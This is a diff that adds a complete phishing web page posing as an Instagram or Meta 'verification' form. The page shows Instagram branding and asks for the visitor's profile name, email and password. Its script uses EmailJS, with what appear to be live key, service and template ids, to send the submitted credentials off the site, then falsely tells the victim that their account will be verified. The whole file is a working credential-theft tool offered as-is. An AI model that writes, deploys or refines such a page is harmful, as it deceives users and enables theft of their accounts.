@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram meta verification </title>
+
+ <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #fafafa;
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg');
+    background-repeat: no-repeat;
+    background-position: center center;
+    background-size: 150px;
+    color: #333333;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+  }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: #FFD700;
+            padding: 30px;
+            border-radius: 15px;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0 15px;
+            border: none;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        textarea {
+            height: 120px;
+            resize: vertical;
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            background: #00aaff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        #status {
+            text-align: center;
+            margin-top:15px;
+}
+
+
+    </style>
+</head>
+
+<body>
+
+
+<div class="container">
+    <h1>Enter Your instagram profile name and password </h1>
+
+    <form id="contact-form">
+
+        <label>profile Name</label>
+        <input type="text" name="name" placeholder="Enter your profile name" required>
+
+        <label>Email</label>
+        <input type="email" name="email" placeholder="Enter your email" required>
+
+        <label>password</label>
+        <textarea name="password"></textarea>
+
+        <button type="submit">Submit</button>
+
+    </form>
+
+    <p id="status"></p>
+</div>
+
+<script>
+    emailjs.init({
+        publicKey: "SyEY3sStG5TetZnpJ"
+    });
+
+    document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const status = document.getElementById("status");
+        status.textContent = "Sending...";
+
+        emailjs.sendForm(
+            "service_8zw59t",
+            "template_w12vo9h",
+            this
+        )
+        .then(function() {
+            status.textContent = "✅ your instagram account will be verified !";
+            document.getElementById("contact-form").reset();
+        })
+        .catch(function(error) {
+            console.error("EmailJS error:", error);
+            status.textContent = "❌ Something went wrong. Check your EmailJS template.";
+        });
+    });
+</script>
+
+</body>
+</html>
